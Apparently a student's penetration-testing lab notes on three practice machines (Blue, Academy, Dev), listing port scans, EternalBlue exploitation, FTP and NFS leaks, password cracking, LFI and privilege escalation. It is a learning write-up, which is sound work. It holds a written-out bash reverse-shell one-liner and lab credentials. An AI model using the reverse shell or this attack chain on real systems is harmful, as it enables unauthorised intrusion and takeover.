# Assessment Notes

- **Blue**
  - ip 10.10.10.8
  - **Nmap**
    - 135 — MSRPC
    - 139 — NetBIOS
    - 445 — SMB
      ![results](/images/Screenshot_2026-10-14_08_43_00.png)
  - **Vulnerability Research**
    - MS17-010 — EternalBlue
      ![results](/images/Screenshot_2026-10-14_08_52_43.png)
  - **Exploitation**
    - Metasploit
    - Privilege escalation to SYSTEM
      ![results](/images/Screenshot_2026-10-14_08_58_17.png)
  - **Findings**
    - Vulnerable SMB service
    - Remote code execution
    - Unpatched Windows system

- **Academy**
  - ip 10.10.10.5
  - **Nmap**
    - 21 — FTP
    - 22 — SSH
    - 80 — HTTP
      ![results](/images/Screenshot_2026-10-14_03_01_57.png)
  - **Enumeration**
    - Anonymous FTP login allowed
    - `note.txt` exposed student information and password hashes
      ![results](/images/Screenshot_2026-10-14_03_11_12.png)
    - `ffuf` discovered `/academy`
      ![results](/images/Screenshot_2026-10-14_03_59_29.png)
    - `Hashcat` used for password cracking
      ![results](/images/Screenshot%20from%202026-10-14%2010-45-06.png)

  - **Exploitation**
    - PHP reverse shell upload
      ` bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
    - Netcat listener
    - Initial access as `www-data`
      ![results](/images/Screenshot_2026-10-14_04_00_42.png)
    - `LinPEAS` privilege enumeration

      ![results](/images/Screenshot_2026-10-14_04_31_08.png)
      ![results](/images/Screenshot_2026-10-14_04_32_09.png)
      `/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";`

    - Root-running backup script
      ![results](/images/Screenshot_2026-10-14_04_43_12.png)

  - **Findings**
    - Anonymous FTP access
    - information disclosure
      ![results](/images/Screenshot_2026-10-14_03_05_15.png)
      ![results](/images/Screenshot_2026-10-14_03_09_27.png)
    - Insecure file upload
    - Privilege escalation through a scheduled script

- **Dev**
  - ip 10.10.10.7
  - **Nmap**
    - 22 — SSH
    - 80 — HTTP
    - 2049 — NFS
    - 8080 — HTTP
    - 111 — RPCBIND
      ![results](/images/Screenshot_2026-10-14_04_55_42.png)

  - **Enumeration**
    - `ffuf` — directory discovery
      - found config file that contain
        - driver: sqlite
          databasename: bolt
          username: bolt
          password: I_love_java
    - `showmount` — NFS share enumeration
    - NFS share exposed `save.zip`
    - `fcrackzip` — ZIP password recovery
      ![results](/images/Screenshot_2026-10-14_06_46_57.png)
      -found id_rsa file
  - **Exploitation**
    - BoltWire CMS local file inclusion (LFI)
      ![results](/images/Screenshot_2026-10-14_07_08_43.png)
      ![results](/images/Screenshot_2026-10-14_07_08_46.png)
    - SSH access
      ![results](/images/Screenshot_2026-10-14_07_09_15.png)
    - `sudo -l` — privilege enumeration
    - Misconfigured `zip` sudo permission
  - **Findings**
    - Exposed NFS share and archive
    - Local file inclusion
    - Credential exposure
    - Privilege escalation to root
      ![results](/images/Screenshot_2026-10-14_07_15_28.png)
